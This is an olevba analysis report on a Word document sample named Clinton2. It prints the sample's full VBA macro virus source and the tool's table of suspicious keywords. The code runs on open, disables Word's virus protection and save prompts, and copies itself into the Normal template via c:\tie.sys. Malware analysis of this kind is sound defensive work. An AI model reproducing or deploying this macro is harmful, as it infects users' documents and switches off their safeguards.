olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.Clinton2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.Clinton2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 73

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

ties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

tier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If tier > 74 And ties > 0 Then GoTo 73

If tier < 74 Then

 Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)

 ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name

 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\tie.sys"

End If

If ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)

 Infection = Int(Rnd * 100)

 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 tvir.codemodule.AddFromFile ("c:\tie.sys")

 With tvir.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

 End With

 If tier < 74 Then

    With tvir.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 79, "Sub ToolsMacro()"
       
    rd1 = Int(Rnd * 25)

 If rd1 = 24 Then .replaceline 67, ".replaceline x, ""'"" & Application.ActivePrinter & Application.ActiveWindow"
    
End With

 End If

 With tvir.codemodule

    For x = 2 To 76 Step 2

    .replaceline x, "'" & Application.UserName & Application.ActiveWindow

    Next x

 End With

73:

 If tier > 74 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

 End Sub

Sub ViewVBCode()

End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

